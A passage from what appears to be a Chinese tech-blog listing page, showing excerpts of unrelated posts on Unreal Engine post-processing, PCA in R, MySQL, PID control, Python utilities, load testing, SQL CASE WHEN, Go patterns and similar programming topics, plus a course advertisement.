因此，调节场景时无法锁定显示效果，故需要先加入自定义的后处理场，将默认的后处理效果“覆盖”。【setting中有对特定后处理禁用的选项；这里不建议直禁用某项功能 】
具体设置： 【反射相关的后处理】 SSR【基于屏幕空的反射】经由相机逆向查找物体对应位置关系计算所得，并非通过HDR手段绘制反射效果。效果在镜头中心位置很真实，边缘由于算法问题会出现真空带(非常明显)；故此用于模拟粗糙表面的反射较好。
举例说明： 由于场景中没有天光(或其他HDR信息提供者)故一个镜面物体的显示效果应当为纯黑，而此时【如下所示】
具体设置： 将屏幕空间的反射强度归零【如下所示】
列举三种HDR反射效果
天光内添加HDR
动态采集添加HDR(捕获场景环境)
静态HDR(手动载入hdr)
如何为良好的照明准备资产 照明前的基本设置 重要内容重复
Post-processing 设置(打光前) 在对场景打光前，需要对 PP 进行一些设置以便得到一致的光照烘焙结果。 (视频10:00 处) ■ 关闭 Auto Exposure (操作：将min brightness和max brightness都改成1) ■ 关闭 SSAO 以及 SSR (操作：ambient occlusion和Screen Space Reflection的intensity改成0) 屏幕空间环境光遮挡(SSAO)是一种近似因光遮挡而导致的光衰减的效果 文档详解 https://docs.unrealengine.com/en-US/Engine/Rendering/LightingAndShadows/AmbientOcclusion/index.html 屏幕空间反射(SSR)是默认情况下启用的一种效果，可更改对象在“材质”表面上的外观。 文档详解 https://docs.unrealengine.com/en-US/Engine/Rendering/PostProcessEffects/ScreenSpaceReflection/index.html ■保持默认 tone mapper (tone mapper，色调映射,其过程可以被认为是模拟胶片对光的响应的一种方法。) ■ Vignetting = off ■ Bloom = off 正确的光照预览参照球材质设置如下： ■ Chrome Sphere 铬球 ■ Base Color 1 ■ Metallic 1 ■ Roughness 0 ■ Grey Sphere 灰度球(50%灰度，sRGB) ■ Base Color 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f2bd96532b4d4f6475d20c0d8d13849/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3079279ec6a886a58ad78ad98a2adba5/" rel="bookmark">
			PCA从原理到实践(基于R）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		声明：
1、作者水平有限，不足之处请指正！
2、本文侧重于R中实现PCA分析。
3、#代表注释，##代表结果。
揭开PCA神秘面纱 1. 简介2. PCA和可视化1. 使用fast.prcomp()函数实现PCA，summary()，str()查看2. screenplot / plot和biplot简单可视化3. ggbiplot可视化4. ggscater可视化5. 番外：利用PCA score进行聚类分析 参考 1. 简介 主成分是数据中的底层结构，是方差最大的方向，是数据分布最广的方向。这意味着当数据沿着这条直线投射时，可以找到那条最能分散数据的直线。这是第一个主成分，这条直线显示了数据中最实质性的变化。
PCA是对给定“宽”数据集进行的一种线性变换，该数据集具有一定数量的变量(坐标)和一定数量的空间值。线性转换将数据集匹配到一个新的坐标系统中，这样在第一个坐标上可以找到最显著的方差，并且随后的每个坐标都与最后一个正交，并且方差较小。通过这种方式，可以将y样本上的一组x相关变量转换为同一样本上的p组不相关主成分。
在许多变量相互关联的情况下，它们都对同一主成分有很大的贡献。每个主成分在数据集中的总变化中合计一定百分比。当初始变量相互之间具有很强的相关性时，能够用少量的主要成分来近似估计数据集中的大部分复杂性。当添加更多的主成分时，将总结越来越多的原始数据集。
PCA具体的原理请参考https://zhuanlan.zhihu.com/p/37777074.
2. PCA和可视化 R stats包提供了prcomp()和princomp()函数，gmodels包提供了fast.prcomp()函数来实现PCA分析。fast.prcomp()比stats包提供的函数快很多。我们使用mtcars数据集进行分析，因为PCA最适合于数值型数据，所以我们将vs和am变量删除，以剩下的数据作为本次的原始数据集进行PCA分析和可视化。
我们首先来比较一下这三种方法的差异。
library(gmodels) library(tidyverse) data &lt;- mtcars %&gt;% select(c(1:7,10,11)) da.prcomp &lt;- prcomp(data) da.princomp &lt;- princomp(data) da.fa.pca &lt;- fast.prcomp(data) 输出数据类型 可以看到，prcomp()和fast.prcomp()输出都为prcomp对象，而princomp()输出对象是princomp，但是本质上都是list。
class(da.fa.pca) # [1] "prcomp" class(da.prcomp) # [1] "prcomp" class(da.princomp) # [1] "princomp" 原理 具体参考简介。 princomp(）是通过对协方差矩阵求解特征值和特征向量来实现PCA分析；prcomp()和fast.prcomp()函数是通过SVD(奇异值分解）来实现PCA分析。从princomp()官方文档可知，其更推荐使用以SVD来实现PCA。
速度 prcomp()明显是比fast.prcomp()函数慢的，在这里就不做测试了。再说点题外话，它们产生的对象存在一定的不同，但对结果没影响。
所以，接下来我们使用fast.prcomp()函数来实现mtcars数据集的PCA分析。
1. 使用fast.prcomp()函数实现PCA，summary()，str()查看 library(gmodels) library(tidyverse) data &lt;- mtcars %&gt;% select(c(1:7,10,11)) da.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3079279ec6a886a58ad78ad98a2adba5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbc25a70f973af67d7146f9d92619d9c/" rel="bookmark">
			Intel oneAPI学习笔记之基本概念＆六大工具包一览
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Intel oneAPI学习笔记之基本概念＆六大工具包一览 Intel oneAPI定义oneAPI是什么？oneAPI 开放式规范包括什么?Data Parallel C++是什么?OpenCl 是什么？CUDA是什么？ 不同的 oneAPI 工具包都包含了什么?Intel® oneAPI Base ToolkitIntel® oneAPI HPC ToolkitIntel® oneAPI IoT ToolkitIntel® oneAPI Rendering ToolkitIntel® AI Analytics ToolkitIntel® Distribution of OpenVINO™ Toolkit 在哪获取 Intel oneAPI 的各种资源？ Intel oneAPI定义 oneAPI是什么？ Intel oneAPI 是一个跨行业、开放、基于标准的统一的编程模型，它为跨 CPU、GPU、FPGA、专用加速器的开发者提供统一的体验，包含两个组成部分∶ 一项行业计划和一款英特尔beta 产品。
oneAPI 开放规范基于行业标准和现有开发者编程模型，广泛适用于不同架构和来自不同供应商的硬件。oneAPI 行业计划鼓励生态系统内基于oneAPI规范的合作以及兼容 oneAPI的实践。
英特尔 oneAPI 产品是英特尔基于oneAPI 的实现，它包括了 oneAPI 标准组件如直接编程工具（Data Parallel C++）、含有一系列性能库的基于 API 的编程工具，以及先进的分析、调试工具等组件。开发人员从现在开始就可以在英特尔 DevCloud for oneAPI 上对基于多种英特尔架构（包括英特尔至强可扩展处理器、带集成显卡的英特尔酷睿处理器、英特尔 FPGA 如英特尔 Arria、Stratix 等）的代码和应用进行测试。
总的来说，单说 Intel oneAPI 只是一个编程模型、一个行业规范，二 Intel oneAPI 相关产品如 Intel oneAPI Base Toolkit、Intel oneAPI HPC Toolkit以及Intel AI Analytics Toolkit则是基于 Intel oneAPI 这一编程模型开发的产品，可以在这里下载https://software.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbc25a70f973af67d7146f9d92619d9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0017dded7f54650b091e73dbfcd5ebaf/" rel="bookmark">
			轻松玩转avr单片机c语言pdf_单片机开发系统的组成及各部分的作用介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单片机的全称为：单片微型计算机
也就是说将计算机的所有功能都集成在一块芯片内的芯片都可以称之为单片机
说白了就是一块集成IC
内部包含中央处理器CPU、程序存储器ROM、数据存储器RAM、I/O口、定时计数器、外部中断、串行通信等内部结构
以单片机为核心，再配合其它外部电路组成的控制系统称为单片机系统
单片机开发一般要求硬件和软件都要在行，因为单片机开发面向的都是最底层的开发，硬件方面可以先从一些常用的电子器件开始(如二极管，三极管，74XXXX系列CD4XXX系列的逻辑芯片，以及一些运放，AD、DA转换，各种串行接口的芯片开始着手)，软件方面的话则可以先从汇编开始，然后再转向C语言开发。
一般我们现在用的比较多的的MCS-51的单片机，它的资料比较多，用的人也很多，市场也很大，我们平时说的C51，C52，S51，S52都是51内核的，只是内存容量有差别，或是烧写程序的方法不同。只要你学会了51，那什么凌阳，AVR，什么样原理都是一样。触类旁通。
开发板和单片机的区别
单片机只是一个芯片， 要加 一些外围电路才能 实现常用的功能
单片机开发板就是单片机主芯片加一些常用电子器件而组成的电路 板，方便初学者学习和实验
上面常用的外设有LED灯 6个或8个数码管 独立按键 矩阵按键 液晶显示屏或其接口
串行EEPROM 24C02 步进电机驱动电路 继电器 红外线接收头等
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b7fe47fd4f0cf7c111604653ce19bbf/" rel="bookmark">
			[MYSQL]如何删除数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
表数据的存储
delete内幕
引发的小问题
如何解决
1.重建一张新表 把数据全部迁移过去
2.alter table X
表数据的存储 表数据既可以存在共享表空间里，也可以是单独的文件。这个行为是由参数 innodb_file_per_table 控制的：
OFF表示存在系统共享表空间
ON表示每张表存在一个独立的 XX.idb文件中 （drop table的时候 直接删除文件，如果是存在系统共享空间中，空间不会被回收） 为了方便管理，一般建议该值设置成on，5.6.6版本开始 这个值默认就是ON。
delete内幕 数据记录被删除，记录的物理空间不会被回收，只会标记成被删除 可复用，数据页也是一样。
引发的小问题 所以会导致一个诡异的事件-&gt;数据被delete了，但是磁盘空间不会变小
如何解决 1.重建一张新表 把数据全部迁移过去 由于大量的删除 更新 或者无序插入，会导致数据页很多空洞的地方无法被利用。重建一张表 顺序插入，充分填充数据页
2.alter table X 流程如下图，5.6之前的都是“离线”的不支持写入操作，5.6开始可以支持online DDL了 （具体的可以看online DDL那篇）
这个也是要业务低峰期操作
小细节
alter table t engine=innodb,ALGORITHM=inplace; 【默认就是这个】
这个里面的临时文件就是在innodb内部产生的
alter table t engine=innodb,ALGORITHM=copy;
这个临时文件是在server层做的
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46e72c6eca132188713528f7862b44f2/" rel="bookmark">
			pyautogui效率慢优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pyautogui为了安全的，有一个默认延迟时间0.1s，我们可以对其进行修改来改善效率：
from ctypes import windll
import time
import pyautogui
pyautogui.PAUSE = 0.005
print(time.time())
for i in range(20):
windll.user32.SetCursorPos(900, 300)
pyautogui.click()
windll.user32.SetCursorPos(900, 200)
pyautogui.click()
print(time.time())
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/291d36157987bed256c16cc64a963045/" rel="bookmark">
			增量式pid调节方式有何优点_PID控制在变频器驱动系统中的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在企业生产中，往往需要有稳定的压力、温度、流量、液位或转速，作为保证产品质量、提高生产效率、满足工艺要求的前提，这时就要用到变频器的PID控制功能。PID控制在生产过程中是一种普遍采用的控制方式，在机电、冶金、机械、化工等行业中获得了广泛的应用。
通过变频器实现PID控制有两种情况：一种是变频器内置PID控制功能，给定信号通过变频器的键盘面板或端子输入，反馈信号反馈给变频器的控制端，在变频器内部进行PID调节以改变输出频率；另一种是用外部的PID调节器将给定量与反馈量比较后输出给变频器加到控制端子作为控制信号。总之，变频器的PID控制是与传感器元件构成的一个闭环控制系统，可以实现对被控制量的自动调节。
PID就是比例微分积分控制，是一种闭环控制。它将偏差比的比例、积分和微分通过线性组合构成控制量，对被控对象进行控制。
1．基本PID控制框图
如图1所示为基本PID控制框图。
图1 基本PID控制框图
2．PID控制概述
在工艺生产和机械设备的自动控制中，一般PID操作不单独作用，即P（增益）、I（积分时间）、D（微分时间）不单独使用。常使用PI控制、PD控制和PID控制等组合控制方式。
1) PI控制
仅用P动作控制，不能完全消除偏差。为了消除残留偏差，一般采用增加I动作的P+I控制，即P和I运算之和。用PI控制时，能消除由改变目标值和经常的外来扰动等引起的偏差。但是I动作过强时，对快速变化偏差响应迟缓。对于有积分元件的负载系统，也可以单独使用P动作控制。
2) PD控制
当发生偏差时，很快会产生比单独D动作还要大的操作量，以抑制偏差的增加。当偏差减小，P动作的作用减小。若是控制对象含有积分元件负载的场合，仅P动作控制，有时由于此积分元件作用，系统会发生振荡。在该场合，为使P动作的振荡衰减和系统稳定，可用PD控制，即P和D运算之和。换言之，PD控制适用于过程本身没有制动作用的负载。
3) PID控制
PID控制是利用PI控制和PD控制的优点组合成的控制。PID运算是P、I和D三个运算的总和，可获得无偏差、精度高和系统稳定的控制过程。
(1)负作用：当偏差X（目标值一测定值）为正时，增加执行量（输出频率）；如果偏差为负，则减小执行量。PID负作用如图2所示。
图2 PID负作用示意图
(2)正作用：当偏差X（目标值-测定值）为负时，增加执行量（输出频率）；如果偏差为正，则减小执行量。PID正作用如图3所示。
图3 PID正作用示意图
3．反馈信号的接入方法
变频器反馈信号的接人方法有两种，即给定输入法和独立输入法。
(1)给定输入法：变频器在使用PID功能时，将传感器测得的反馈信号直接接到给定信号端，其目标信号由键盘给定。
(2)独立输入法：变频器专门配置了独立的反馈信号输入端，有的变频器还为传感器配置了电源，其目标值可以由键盘给定，也可以由指定输入端输入。
4．PID调节功能的预置
1)预置PID调节功能
预置的内容是变频器的PID调节功能是否有效。变频器的PID调节功能有效后，其加/减速过程将完全取决于由P、I、D数据决定的动态响应过程，而原来预置的“加速时间”和“减速时间”将不再起作用。
2)目标值的预置
PID调节的根本依据是反馈量与目标量之间进行比较的结果。因此，准确地预置目标值是很重要的，主要有以下两个方面。
(1)面板输入式：只需通过键盘输入目标值即可。目标值通常是被测量实际大小与传感器量程之比的百分数。例如，空气压缩机要求的压力（目标压力）为6MPa，所用压力表的量程是0～10Mpa，则目标值为60%。
(2)外部给定式：由外接电位器进行预置，调节较方便。
5．变频器按P、I、D调节规律运行时的特点
(1)变频器的输入频率只根据实际数值与目标值的比较结果进行调整，与被控量之间无对应关系。
(2)变频器的输出频率始终处于调整状态，其数值常不稳定。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce59da40cf8e22ddf0e06c1bc016fd9f/" rel="bookmark">
			python合并pdf文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 from PyPDF2 import PdfFileReader, PdfFileWriter def merge_pdfs(paths, output): pdf_writer = PdfFileWriter() for path in paths: pdf_reader = PdfFileReader(path) for page in range(pdf_reader.getNumPages()): # Add each page to the writer object pdf_writer.addPage(pdf_reader.getPage(page)) # Write out the merged PDF with open(output, 'wb') as out: pdf_writer.write(out) if __name__ == '__main__': paths = ["需要合并的发票路径名称"] merge_pdfs(paths, output='合并后的发票命名') 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45b921bcae1279318a32960a9b7b742b/" rel="bookmark">
			tcp压测工具_【解决方案】性能压测及分析调优实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【关键导读】结合一次重保活动的性能压测需求，详解了整体的性能测试策略及性能分析思路，并在实施过程中有效利用了网易易测的NPT性能测试平台一站式完成了压测场景设计、执行、业务指标监控、性能指标分析等活动，结合监控找出了性能瓶颈并给出了相应的性能优化解决方案
0.背景说明 A业务有大促活动，对B业务有依赖，要求B业务对于X场景能够持续稳定支撑1.4w TPS 5min， 如此要对B业务进行性能压测，完成对应的性能需求。
1.性能测试策略 如下所示，接下来按照这个思路去分析下整个性能测试实践的流程。
典型性能测试策略及流程 1.1 性能需求指标 容量指标：X场景支撑1.4W TPS 持续5min
1.2 性能模型建立 【业务模型】
涉及的场景包含A-》B-》C-》D共4个接口，按照真实业务分析流量比例为3:1:1:1 【监控模型】
监控对象 – 测试活动中的所有服务器，测试机、应用服务器、数据库服务器、缓存服务器、依赖服务等资源监控 – 所有被测的应用服务监控，Nginx、tomcat、MySQL等。 监控内容 业务指标：吞吐量、响应时间、失败率 资源监控：CPU、内存、磁盘、网络、IO 日志信息：错误、异常、关键业务日志 进程监控：CPU、内存、进程状态、线程状态 一个典型的linux 性能监控工具图： 1.3 性能测试方案设计 测试环境：线上真实业务集群
测试数据：场景是从客户端APP发起调用接口，考虑到线上数据样本不涉及隐私及敏感数据且可以复用，不会对用户造成数据污染。故从线上捞取了100万用户数据样本。
压力策略： 1）先摸高，按照一定的线程递增策略，根据预期目标是否有性能瓶颈 2）峰值容量持续压测，观察系统的承受及处理能力 2.性能测试执行及分析 利用NPT性能压测平台完成整个性能压测活动
易测NPT_性能压测_一站式测试解决方案-网易数帆​www.163yun.com 2.1 容量场景：TPS摸高 性能压测模型及场景设计 经过压测在NPT平台中压测后的TPS-RT曲线如下 容量场景：TPS-RT曲线 接下来按照性能分析的典型思路给大家逐一介绍下： 性能分析思路 【瓶颈的精准判断】 很多情况下，在分析系统性能瓶颈的时候，我们总是想找到性能瓶颈的那个“拐点”，但是实际上大部分系统其实是没有明确的拐点的。在实际操作中需要按照固定递增幅度增加并发线程数，进而对于TPS 的增加控制得更为精准，实际业务中TPS的增加是有一个有清晰的弧度，而不是有一个非常清晰的拐点。 从上图业务真实TPS-RT曲线中可以做出以下判断：在线程逐步递增的过程中，TPS按照固定比例上升与线程数呈现线性增长，达到一定的压力的情况下，TPS的增长幅度在衰减，最后逐步趋于平稳。以此可以判断出业务在一定的压力情形下出现了性能瓶颈。为了更加清晰判断性能瓶颈，接下来分析下性能衰减的过程。 【性能衰减的过程】 所谓的性能衰减可以通过每线程每秒请求数在逐渐变少来反应，即使TPS仍在增加，如下针对压测业务采用3个点，计算每线程每秒请求数 采样点1：每线程每秒请求数=9547/270=35.3 采样点2：每线程每秒请求数=13461/450=29.9 采样点3：每线程每秒请求数=13773/495=27.8 由此可以得到如下结论 只要每线程每秒的请求数开始变少，就意味着性能瓶颈已经出现了。但是瓶颈出现之后，并不是说服务器的处理能力（这里我们用 TPS 来描述）会下降，应该说 TPS 仍然会上升，在性能不断衰减的过程中，TPS 就会达到上限。 在这个场景的测试过程中，在性能瓶颈出现后，继续保持递增的压力，让瓶颈更为明显，可以看如下TPS-RT的曲线，我们会更加清晰的看到压力还在逐步增加，但TPS已经趋于平稳，而平均RT却在不断上升 【响应时间的拆分】 基于性能瓶颈的出现，接下来就需要分析在性能瓶颈出现时，哪个链路耗时增加明显导致请求RT变长。那么首先需要做的是画出请求的整个业务链路。这里的策略是：先粗后细，先从较粗的粒度划分，确认耗时较长的链路节点，然后再细分粒度可能到某个方法。我们先来看一个典型的响应时间RT的分布链路 响应时间 = (N1+N2+N3+N4)+(A1+A2+A3)，一般我们优先关注的是A1、A2、A3，对于网络传输处理，在这里优先默认它表现良好 基于业务场景的链路： 第三方依赖服务采用了hystrix降级熔断组件实现了独立线程池隔离调用。 1）首先要排除发压端是否有瓶颈，查看发压端服务器监控，CPU利用率和负载都还不到10%
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/45b921bcae1279318a32960a9b7b742b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6180e9a9e88f2f20e794f23d5f2e54e/" rel="bookmark">
			spss回归分析_spss数据分析-线性回归（多元线性回归）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		回归分析用于解释变量之间的因果关系的，研究的是自变量和因变量之间关系的方法。比方说研究企业所得税优惠额、净资产收益率、企业规模、年份对于对企业专利产出的影响是否显著，以及影响的大小。通过回归分析就可以研究出来。
线性回归的方式还有输入，步进，除去，后退，前进几种不同的方法，其中最常用的方法是输入和步进的方法，两种方法的区别是输入的方法是一次性的把所有的自变量纳入到回归分析的模型中，去构建一个回归分析模型。步进的方法是用来通过spss自动构建回归方程，把自变量依次一个一个的放入到回归方程中，这样会生成多个回归模型。
另外回归分析还可以分层的方法，分层主要是为了排除控制变量的影响。一般控制变量指的是基本信息的变量，需要排除这些信息的影响。分层的时候第一层放入控制变量，第二层放入自变量。
分析结果的解读：
首先第一个表格为模型摘要表，主要是看自变量对于因变量的解释程度，R方一般在0.8以上，会认为效果比较好，所以该表的解释为：通过上表可以看出R方为0.309，所以说明自变量可以解释30.9%的因变量的信息量。说明自变量对因变量的解释效果不是很好。这种情况下如果导师要求比较严格的话会要求重新做数据的。
该表格为方差表，主要是判断模型整体是否具有显著性，解释为：通过上表可以看出F值为18.768，显著性为0.000，远远小于0.05，所以说明回归方程具有显著性。
通过上表可以看出因变量企业专利产出和自变量(常量)、企业所得税优惠额（TAX）、净资产收益率（ROE）、企业规模（SIZE）之间的关系。首先通过上表看显著性水平，通过上表可以看出只有TAX是显著，其余的变量没有显著性，说明除了TAX变量之外的变量对于因变量PA均没有显著性额影响。所以得出的结论为：
PA = 0.004*TAX
所以说明PA会随着TAX的增长而增长。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67eaf533eb486b3aad2db721be32f051/" rel="bookmark">
			大型综合大数据实战项目课程分享——涛哥出品（重磅OFFER杀手）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《Titan大型综合数据运营系统》 这套课程，乃涛哥呕心沥血之作，分享给有缘人！
299的课程，价值实在远超价格的10倍以上，得之者，幸！
B站上有老的公开版；
不过B站老版本的架构、设计、各需求具体实现方案等，相比本新版本来说，有诸多不成熟之处，有许多未填之坑；
学习此版本，将为你的大数据面试求职之路铺就康庄大道，在项目经验论述这块，你将游刃有余！
课程内容涵盖 互联网行业用户行为分析数据仓库建设OLAP分析平台用户画像机器学习算法数据挖掘精准广告投放 等诸多企业重点数据开发内容，各模块同属一个完整系统，融会贯通，浑然一体
当然，本版本，也还不是最终形态，后续还将在项目中添加实时计算部分，乃至最终演化成全实时数据系统
课程实际讲授时长近200小时 项目在线下的总授课时长达近20天
项目所涉及的文档就有如此之多
本课程的价值 在线下班已经经过多期实际验证；
自从课程中实施该项目以来，零基础学员平均就业薪资直冲18k以上；
有开发经验转大数据的同学，普遍都在25k以上；
很多学员在面试时只要把这个项目结合自己的经验给描述好了，offer就基本到手！
学习途径 扫描前文中的分享海报，即可学习；
也可以直接访问 https://v.51doit.cn 或扫描下图中的二位码到“易学在线”选择更多课程学习
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08aa8efc945f55b5e6cc08504b6d9173/" rel="bookmark">
			GopherChina 2020 Go Programming Patterns 学习笔记篇2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇继续学习左耳朵耗子老师的Go Programming Patterns下半部分，PPT太长了，70多页。
Topic 10 函数化的选项配置 由于Golang不允许使用同一个名字来命名函数，必须是不同的名称，即使参数不同，这与Java不一样，java的方法签名是包含参数的。所以遇到那种多个参数来实例化一个变量的，就会比较麻烦。会有类似代码产生：
type Server struct { Addr string Port int Protocol string Timeout time.Duration MaxConns int TLS *tls.Config } func NewServer(addr string, port int) (*Server, error) { //... } func NewTLSServer(addr string, port int, tls *tls.Config) (*Server, error) { //... } func NewServerWithTimeout(addr string, port int, timeout time.Duration) (*Server, error) { //... } func NewTLSServerWithMaxConnAndTimeout(addr string, port int, maxconns int, timeout time.Duration, tls *tls.Config) (*Server, error) { //.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08aa8efc945f55b5e6cc08504b6d9173/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bd7d3c1bb6e286fdcb496d80a99ebca/" rel="bookmark">
			蓝牙最新版本6.0_华为P40系列获蓝牙认证：3月份巴黎发布
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		↑↑↑点击上方蓝字订阅每日最新国产手机资讯
今天上午，据腾讯数码报道，根据蓝牙SIG最新公布的信息显示，华为旗下已经有三款新机获得蓝牙认证，均支持蓝牙5.1技术。而据内部人士称，备受关注的华为P40系列就在这次获得认证的三款新机当中。
蓝牙SIG还公布了此次通过认证三款新机的具体型号，分别为ANA-AN00/TN00、ELS-AN00/AN10/TN00和ELP-AN10，另外认证信息还显示，这三款新机均支持5G网络。
除了蓝牙认证信息之外，近日海外爆料博主@Teme发布推特称，华为P40 Pro将采用曲面屏设计，屏幕供应商来自三星和LG。华为近年来旗舰产品的Pro版本均采用了曲面屏设计，因此P40 Pro配备曲面屏的可能性也基本可以确认。至于屏幕形态，从19年底，打孔屏就成为了主流屏幕形态，近期的多个版本的曝光也指向了华为P40系列将采用打孔方案。
根据余承东此前在公开采访时透露的消息，华为P40系列将有更好的拍照、更强的手机性能以及更完美的自主设计。华为P40系列将于今年3月份在法国巴黎正式发布，国产手机资讯将与大家共同关注有关P40系列最新的爆料消息。
↓↓↓点击了解详情
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/440e441a3616a4ab4685602e979837d0/" rel="bookmark">
			深度学习入门（5）如何对神经网络模型训练结果进行评价
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何对神经网络模型训练结果进行评价 上一篇文章《深度学习入门（4）【深度学习实战】无框架实现两层神经网络的搭建与训练过程》介绍了基于mnist的手写体数字集的两层神经网络的搭建与训练过程，通过损失函数的训练结果我们可以发现，随着训练的进行，损失函数逐渐减小，但是光这一点并不能很好的说明该神经网络的训练结果能够很好的对于其他数据也能够达到同样的精确度。这就涉及到神经网络的泛化能力问题。神经网络学习的最初目标是掌握泛化能力，因此，要评价神经网络的泛化能力，就必须使用不包含在训练数据中的数据。
过拟合 神经网络的学习中，必须确认是否能够正确识别训练数据以外的其他数据，即确认是否会发生过拟合。过拟合是指，虽然训练数据中的能够达到很好的识别精度，但是对于测试数据的识别精度却效果很差。
神经网络的评价 基于上一篇文章自己搭建的神经网络，本文我们对于不同的epoch次数下的训练数据和测试数据的识别精度进行输出，对两个识别精度进行比较，看该神经网络训练的结果是否也能够很好的识别测试数据。
注：epoch表示学习中所有的训练数据均被使用过一次的更新次数。
训练集与测试集精度的比较，实现代码如下：（网络的搭建代码见上一篇文章）
import sys, os import numpy as np import matplotlib.pyplot as plt from dataset.mnist import load_mnist from two_layer_net import TwoLayerNet #导入自己搭建的两层神经网络 # 读入数据 (x_train, t_train), (x_test, t_test) = load_mnist(normalize=True, one_hot_label=True) network = TwoLayerNet(input_size=784, hidden_size=50, output_size=10) iters_num = 10000 # 设定循环的次数1000 train_size = x_train.shape[0] batch_size = 100 learning_rate = 0.1 train_acc_list = [] #记录训练集的识别精度 test_acc_list = [] #记录测试集的识别精度 iter_per_epoch = max(train_size / batch_size, 1) for i in range(iters_num): batch_mask = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/440e441a3616a4ab4685602e979837d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d09535f934533f60042a3ae65b868d50/" rel="bookmark">
			SQL语句条件判断之case when基本用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常开发中
有些需求我们无法避免的要在SQL语句中进行类似于Java中if判断的操作,那SQL语句是否可以满足呢?
本文将介绍SQL条件判断关键字case when的基本用法
基本语法 case x when y then z else m end 乍一看看不懂没关系,我们把它拆分开解释
case x 意思就是设置一个参数,x可以是一个数据库字段,也可以是一个dao层传递的参数,也可以是一个固定值 when y 意思就是给设定的x参数设置条件 then z 就是当x满足y条件之后做的操作,类似于Java中if条件为true的情况 else m 当x不满足y条件时的操作,类似于Java中的if条件为false的else代码块 end 代表本case when语句结束,每个case when语句都要带有end 否则sql语句报错 整体解释就是
设置一个x参数,当x满足y时执行z 不满足时执行m(x可忽略,原因请看下文中的举例.)
应用举例 1.用于SELECT之后,FROM之前,判断要查询的字段 假设dao传递了一个type参数,查询User表中的password字段,并且当type为1时 查询帐号,当type为2时,查询用户id
SELECT PASSWORD, CASE #{type} WHEN 1 THEN id WHEN 2 THEN loginName ELSE money END AS Data FROM USER 执行结果
2.用于Where之后,用于判断要根据哪个条件查询 查询User表的全部,当表的id字段为1的时候,根据id='1’查询 当表的id字段为2的时候 根据loginName='1’查询,否则根据todayMoney='1’查询
SELECT * FROM USER WHERE CASE id WHEN '1' THEN id WHEN '2' THEN loginName ELSE todayMoney END ='1' 执行结果
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d09535f934533f60042a3ae65b868d50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23fbca718ad79b5a6d2c4e3220271c9c/" rel="bookmark">
			cglib、orika、spring等bean copy工具性能测试和原理分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 在实际项目中，考虑到不同的数据使用者，我们经常要处理 VO、DTO、Entity、DO 等对象的转换，如果手动编写 setter/getter 方法一个个赋值，将非常繁琐且难维护。通常情况下，这类转换都是同名属性的转换（类型可以不同），我们更多地会使用 bean copy 工具，例如 Apache Commons BeanUtils、Cglib BeanCopier 等。
在使用 bean copy 工具时，我们更多地会考虑性能，有时也需要考虑深浅复制的问题。本文将对比几款常用的 bean copy 工具的性能，并介绍它们的原理、区别和使用注意事项。
项目环境 本文使用 jmh 作为测试工具。
os：win 10
jdk：1.8.0_231
jmh：1.25
选择的 bean copy 工具及对应的版本如下：
apache commons beanUtils：1.9.4
spring beanUtils：5.2.10.RELEASE
cglib beanCopier：3.3.0
orika mapper：1.5.4
